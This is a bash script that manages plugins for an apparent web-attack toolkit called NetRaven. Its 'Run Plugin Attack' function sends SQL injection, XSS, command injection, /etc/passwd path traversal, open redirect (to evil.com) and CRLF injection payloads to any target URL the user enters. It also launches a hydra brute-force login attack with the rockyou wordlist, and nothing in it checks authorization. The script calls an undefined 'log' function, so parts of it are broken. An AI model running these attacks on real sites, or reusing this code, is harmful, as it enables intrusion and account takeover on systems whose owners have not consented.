#!/bin/bash

# NetRaven Plugin Loader
# Manages .nrav plugin files with .nrav.meta metadata

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

PLUGIN_DIR="$HOME/.netraven/plugins"
mkdir -p "$PLUGIN_DIR"

plugin_menu() {
    while true; do
        clear
        echo -e "${CYAN}=== Plugin Manager ===${NC}"
        echo
        echo -e "${CYAN}[1]${NC}  List Installed Plugins"
        echo -e "${CYAN}[2]${NC}  Install Plugin (.nrav file)"
        echo -e "${CYAN}[3]${NC}  Remove Plugin"
        echo -e "${CYAN}[4]${NC}  Run Plugin Attack"
        echo -e "${CYAN}[5]${NC}  Validate Plugin"
        echo -e "${CYAN}[6]${NC}  Create New Plugin"
        echo -e "${CYAN}[7]${NC}  Plugin Directory"
        echo -e "${CYAN}[0]${NC}  Back to Main Menu"
        echo
        read -p "Select option: " opt

        case $opt in
            1) list_plugins ;;
            2) install_plugin ;;
            3) remove_plugin ;;
            4) run_plugin ;;
            5) validate_plugin ;;
            6) create_plugin ;;
            7) show_plugin_dir ;;
            0) break ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        read -p "Press Enter to continue..."
    done
}

list_plugins() {
    log "Installed Plugins"
    if [ -d "$PLUGIN_DIR" ]; then
        local count=0
        for plugin in "$PLUGIN_DIR"/*.nrav; do
            if [ -f "$plugin" ]; then
                local name=$(basename "$plugin" .nrav)
                local meta_file="$PLUGIN_DIR/${name}.nrav.meta"
                echo -e "${CYAN}---${NC} $name"
                if [ -f "$meta_file" ]; then
                    while IFS='=' read -r key value; do
                        echo "  $key: $value"
                    done < "$meta_file"
                fi
                count=$((count + 1))
            fi
        done
        if [ $count -eq 0 ]; then
            echo -e "${YELLOW}No plugins installed${NC}"
        else
            echo -e "${GREEN}Total plugins: $count${NC}"
        fi
    else
        echo -e "${YELLOW}No plugin directory found${NC}"
    fi
}

install_plugin() {
    log "Install Plugin"
    read -p "Path to .nrav file: " plugin_path

    if [ ! -f "$plugin_path" ]; then
        echo -e "${RED}[!] File not found: $plugin_path${NC}"
        return
    fi

    if [[ "$plugin_path" != *.nrav ]]; then
        echo -e "${RED}[!] File must have .nrav extension${NC}"
        return
    fi

    local plugin_name=$(basename "$plugin_path")
    local meta_path="${plugin_path%.nrav}.nrav.meta"

    if [ ! -f "$meta_path" ]; then
        echo -e "${YELLOW}[!] No .nrav.meta file found alongside the plugin${NC}"
        read -p "Continue without meta? (y/n): " confirm
        if [ "$confirm" != "y" ]; then
            return
        fi
    fi

    cp "$plugin_path" "$PLUGIN_DIR/"
    if [ -f "$meta_path" ]; then
        cp "$meta_path" "$PLUGIN_DIR/"
    fi

    echo -e "${GREEN}[+] Plugin installed: $plugin_name${NC}"
}

remove_plugin() {
    log "Remove Plugin"
    read -p "Plugin name (without .nrav): " plugin_name

    if [ -f "$PLUGIN_DIR/${plugin_name}.nrav" ]; then
        rm -f "$PLUGIN_DIR/${plugin_name}.nrav"
        rm -f "$PLUGIN_DIR/${plugin_name}.nrav.meta"
        echo -e "${GREEN}[+] Plugin removed: $plugin_name${NC}"
    else
        echo -e "${RED}[!] Plugin not found: $plugin_name${NC}"
    fi
}

run_plugin() {
    log "Run Plugin Attack"
    read -p "Plugin name: " plugin_name
    read -p "Target URL: " target_url

    if [ ! -f "$PLUGIN_DIR/${plugin_name}.nrav" ]; then
        echo -e "${RED}[!] Plugin not found: $plugin_name${NC}"
        return
    fi

    echo -e "${YELLOW}[*] Running plugin: $plugin_name${NC}"
    echo -e "${YELLOW}[*] Target: $target_url${NC}"

    local meta_file="$PLUGIN_DIR/${plugin_name}.nrav.meta"
    if [ -f "$meta_file" ]; then
        echo -e "${CYAN}Plugin Info:${NC}"
        cat "$meta_file"
        echo
    fi

    local plugin_file="$PLUGIN_DIR/${plugin_name}.nrav"
    local attack_type=$(grep -oP '<attack\s+type="[^"]+"' "$plugin_file" 2>/dev/null | grep -oP 'type="[^"]+"' | sed 's/type="//;s/"//')

    if [ -z "$attack_type" ]; then
        echo -e "${RED}[!] No attack type defined in plugin${NC}"
        return
    fi

    echo -e "${CYAN}Attack type: $attack_type${NC}"

    case $attack_type in
        sqli)
            local param="id"
            local test_url="${target_url}/page.php?id=1"
            echo -e "${YELLOW}[*] Testing SQL Injection on: $test_url${NC}"
            local payload="' OR '1'='1"
            local response=$(curl -s "${test_url/$param=1/$param=$payload}" 2>/dev/null)
            if echo "$response" | grep -qi "sql\|syntax\|error\|mysql"; then
                echo -e "${RED}[+] SQL Injection VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No SQL injection detected${NC}"
            fi
            ;;
        xss)
            local param="q"
            local test_url="${target_url}/search.php?q=test"
            echo -e "${YELLOW}[*] Testing XSS on: $test_url${NC}"
            local payload="<script>alert(1)</script>"
            local response=$(curl -s "${test_url/$param=test/$param=$payload}" 2>/dev/null)
            if echo "$response" | grep -q "$payload"; then
                echo -e "${RED}[+] XSS VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No XSS detected${NC}"
            fi
            ;;
        cmdi)
            local param="cmd"
            local test_url="${target_url}/exec.php?cmd=whoami"
            echo -e "${YELLOW}[*] Testing Command Injection on: $test_url${NC}"
            local payload=";id"
            local response=$(curl -s "${test_url/$param=whoami/$param=$payload}" 2>/dev/null)
            if echo "$response" | grep -q "uid="; then
                echo -e "${RED}[+] Command Injection VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No command injection detected${NC}"
            fi
            ;;
        lfi)
            local param="file"
            local test_url="${target_url}/view.php?file=index"
            echo -e "${YELLOW}[*] Testing LFI on: $test_url${NC}"
            local payload="../../../../etc/passwd"
            local response=$(curl -s "${test_url/$param=index/$param=$payload}" 2>/dev/null)
            if echo "$response" | grep -q "root:x"; then
                echo -e "${RED}[+] LFI VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No LFI detected${NC}"
            fi
            ;;
        bruteforce)
            echo -e "${YELLOW}[*] Running brute force attack${NC}"
            hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt "$target_url" http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" 2>/dev/null | head -n 20
            ;;
        open_redirect)
            local param="url"
            local test_url="${target_url}/redirect.php?url=home"
            echo -e "${YELLOW}[*] Testing Open Redirect on: $test_url${NC}"
            local payload="https://evil.com"
            local redirect=$(curl -s -o /dev/null -w "%{redirect_url}" "${test_url/$param=home/$param=$payload}" 2>/dev/null)
            if echo "$redirect" | grep -q "evil.com"; then
                echo -e "${RED}[+] Open Redirect VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No open redirect detected${NC}"
            fi
            ;;
        csrf)
            echo -e "${YELLOW}[*] Checking for CSRF tokens${NC}"
            local response=$(curl -s "$target_url" 2>/dev/null)
            if echo "$response" | grep -qi "csrf\|token\|_token\|nonce"; then
                echo -e "${GREEN}[+] CSRF protection detected${NC}"
            else
                echo -e "${RED}[+] No CSRF tokens found - potential vulnerability${NC}"
            fi
            ;;
        clickjacking)
            echo -e "${YELLOW}[*] Checking for Clickjacking protection${NC}"
            local response=$(curl -sI "$target_url" 2>/dev/null)
            if echo "$response" | grep -qi "x-frame-options\|frame-ancestors"; then
                echo -e "${GREEN}[+] Clickjacking protection detected${NC}"
            else
                echo -e "${RED}[+] Missing X-Frame-Options - vulnerable to clickjacking${NC}"
            fi
            ;;
        crlf)
            local param="input"
            local test_url="${target_url}/redirect.php?input=test"
            echo -e "${YELLOW}[*] Testing CRLF Injection on: $test_url${NC}"
            local payload="%0d%0aSet-Cookie:injected=true"
            local response=$(curl -s -D - "${test_url/$param=test/$param=$payload}" 2>/dev/null)
            if echo "$response" | grep -qi "injected=true"; then
                echo -e "${RED}[+] CRLF Injection VULNERABLE!${NC}"
            else
                echo -e "${GREEN}[-] No CRLF injection detected${NC}"
            fi
            ;;
        *)
            echo -e "${YELLOW}[*] Running generic plugin attack: $attack_type${NC}"
            curl -s "$target_url" | head -n 50
            ;;
    esac
}

validate_plugin() {
    log "Validate Plugin"
    read -p "Path to .nrav file: " plugin_path

    if [ ! -f "$plugin_path" ]; then
        echo -e "${RED}[!] File not found${NC}"
        return
    fi

    local errors=0

    if ! grep -q "<plugin>" "$plugin_path"; then
        echo -e "${RED}[!] Missing <plugin> root element${NC}"
        errors=$((errors + 1))
    fi

    if ! grep -q "<name>" "$plugin_path"; then
        echo -e "${RED}[!] Missing <name> element${NC}"
        errors=$((errors + 1))
    fi

    if ! grep -q "<attack" "$plugin_path"; then
        echo -e "${RED}[!] Missing <attack> element${NC}"
        errors=$((errors + 1))
    fi

    local meta_path="${plugin_path%.nrav}.nrav.meta"
    if [ ! -f "$meta_path" ]; then
        echo -e "${YELLOW}[!] Missing .nrav.meta file${NC}"
        errors=$((errors + 1))
    else
        if ! grep -q "^name=" "$meta_path"; then
            echo -e "${RED}[!] .nrav.meta missing 'name' field${NC}"
            errors=$((errors + 1))
        fi
        if ! grep -q "^version=" "$meta_path"; then
            echo -e "${RED}[!] .nrav.meta missing 'version' field${NC}"
            errors=$((errors + 1))
        fi
        if ! grep -q "^category=" "$meta_path"; then
            echo -e "${RED}[!] .nrav.meta missing 'category' field${NC}"
            errors=$((errors + 1))
        fi
        if ! grep -q "^requires=" "$meta_path"; then
            echo -e "${YELLOW}[!] .nrav.meta missing 'requires' field${NC}"
        fi
    fi

    if [ $errors -eq 0 ]; then
        echo -e "${GREEN}[+] Plugin is valid${NC}"
    else
        echo -e "${RED}[!] Plugin has $errors error(s)${NC}"
    fi
}

create_plugin() {
    log "Create New Plugin"
    read -p "Plugin name: " name
    read -p "Version: " version
    read -p "Author: " author
    read -p "Category (sqli/xss/cmdi/lfi/bruteforce/open_redirect/csrf/clickjacking/crlf): " category
    read -p "Description: " description
    read -p "Required tools (comma separated): " requires

    local plugin_file="$PLUGIN_DIR/${name}.nrav"
    local meta_file="$PLUGIN_DIR/${name}.nrav.meta"

    cat > "$plugin_file" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<plugin>
    <name>${name}</name>
    <version>${version}</version>
    <author>${author}</author>
    <description>${description}</description>
    <category>${category}</category>
    <requires>${requires}</requires>
    <attack type="${category}">
        <payload>test</payload>
        <detection>pattern</detection>
    </attack>
</plugin>
EOF

    cat > "$meta_file" <<EOF
name=${name}
version=${version}
author=${author}
category=${category}
description=${description}
requires=${requires}
EOF

    echo -e "${GREEN}[+] Plugin created: $plugin_file${NC}"
    echo -e "${GREEN}[+] Meta file created: $meta_file${NC}"
}

show_plugin_dir() {
    log "Plugin Directory: $PLUGIN_DIR"
    ls -la "$PLUGIN_DIR" 2>/dev/null || echo "Directory is empty or does not exist"
}

plugin_menu
